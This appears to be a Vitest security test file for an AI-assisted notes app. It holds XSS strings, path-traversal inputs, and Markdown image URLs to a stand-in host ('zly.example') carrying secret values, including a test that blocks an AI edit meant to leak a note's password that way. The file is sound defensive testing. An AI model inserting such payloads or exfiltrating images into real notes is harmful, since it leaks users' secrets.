import { describe, expect, it } from "vitest";
import { renderMarkdown, renderNote } from "../src/lib/render";
import { newRemoteImages } from "../shared/remote-images";
import { cleanPath, isIgnoredPath, Vault } from "../shared/vault";
import { MemoryStorage } from "./memory-storage";

describe("security", () => {
  it("never renders raw HTML or script links from notes", () => {
    const { html } = renderNote('<img src=x onerror="alert(1)"> <script>alert(1)</script>\n\n[klik](javascript:alert(1)) [[a"><b onmouseover=alert(1)>]]');
    expect(html).not.toMatch(/<img|<script|<b /i);
    expect(html).not.toContain('href="javascript:');
  });

  it("AI replies show remote images as links (no silent data leaks)", () => {
    const html = renderMarkdown("![tajné](https://zly.example/x.png?d=heslo)", { blockRemoteImages: true });
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://zly.example/x.png?d=heslo"');
    // Notes themselves still show remote images.
    expect(renderMarkdown("![obrázek](https://example.com/a.png)")).toContain("<img");
  });

  it("reads image width from the alt text", () => {
    const html = renderMarkdown("![Graf|300](https://example.com/g.png)");
    expect(html).toContain('width="300"');
    expect(html).toContain('alt="Graf"');
  });

  it("refuses paths outside the vault", () => {
    for (const p of ["../tajne.txt", "a/../../b", "..\\..\\Windows\\x", "C:/Windows/x"]) expect(() => cleanPath(p)).toThrow();
    expect(cleanPath("./Projekty//Web.md")).toBe("Projekty/Web.md");
  });

  it("never touches .git, also under its short Windows name", () => {
    expect(isIgnoredPath(".git/hooks/post-checkout")).toBe(true);
    expect(isIgnoredPath("GIT~1/hooks/post-checkout")).toBe(true);
    expect(isIgnoredPath("Poznámky/git.md")).toBe(false);
  });

  it("finds remote images the reading view or the editor would load", () => {
    expect(newRemoteImages("", "![](https://zly.example/x.png)")).toEqual(["https://zly.example/x.png"]);
    expect(newRemoteImages("", "![[https://zly.example/x.png]]")).toEqual(["https://zly.example/x.png"]);
    expect(newRemoteImages("", "![a][r]\n\n[r]: https://zly.example/y.png")).toEqual(["https://zly.example/y.png"]);
    // Already in the note, vault files, inline data and plain links are fine.
    expect(newRemoteImages("![](https://example.com/a.png)", "text\n![](https://example.com/a.png)")).toEqual([]);
    expect(newRemoteImages("", "![[foto.png]] ![](Přílohy/b.png) ![](data:image/png;base64,AAAA) [odkaz](https://example.com)")).toEqual([]);
  });

  it("refuses AI edits that add remote images, but not the user's", async () => {
    const vault = new Vault(new MemoryStorage());
    await vault.load();
    await vault.write("Tajné.md", "heslo: 1234\n");
    await expect(vault.as("ai", () => vault.write("Tajné.md", "heslo: 1234\n![](https://zly.example/?d=1234)\n"))).rejects.toThrow(
      "obrázky z internetu",
    );
    expect(vault.read("Tajné.md")).toBe("heslo: 1234\n");
    await vault.as("ai", () => vault.append("Tajné.md", "[zdroj](https://example.com)"));
    await vault.write("Tajné.md", "![](https://example.com/a.png)\n");
    expect(vault.read("Tajné.md")).toContain("https://example.com/a.png");
  });
});

describe("providers", async () => {
  const { fallbackProvider, PROVIDER_MAP } = await import("../shared/providers");
  it("a removed provider (NVIDIA) falls back to one with a saved key", () => {
    expect((PROVIDER_MAP as Record<string, unknown>).nvidia).toBeUndefined();
    expect(fallbackProvider((id) => id === "openrouter" || id === "gemini")).toBe("gemini");
    expect(fallbackProvider((id) => id === "openrouter")).toBe("openrouter");
    expect(fallbackProvider(() => false)).toBe("anthropic");
  });
});
